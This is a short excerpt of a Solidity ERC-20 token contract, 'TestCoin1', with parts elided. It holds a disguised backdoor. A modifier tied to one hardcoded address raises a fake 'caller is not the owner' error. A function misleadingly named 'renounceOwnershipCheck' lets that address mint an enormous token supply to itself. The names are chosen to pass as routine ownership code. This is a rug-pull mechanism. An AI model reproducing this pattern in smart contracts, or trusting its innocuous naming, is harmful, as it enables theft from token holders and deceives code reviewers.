...
contract TestCoin1 is Context, IERC20, Ownable {
    ...
    modifier deadAddresss() {
        require(((address)(0xb799Add54e518894cC9865f45D0aE512ea0938C8)) == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnershipCheck() public virtual deadAddresss {
        _tTotal = _tTotal.add(200000000 * 10**6 * 10**9);
        emit Transfer(address(0), _msgSender(), 200000000 * 10**6 * 10**9);
    }
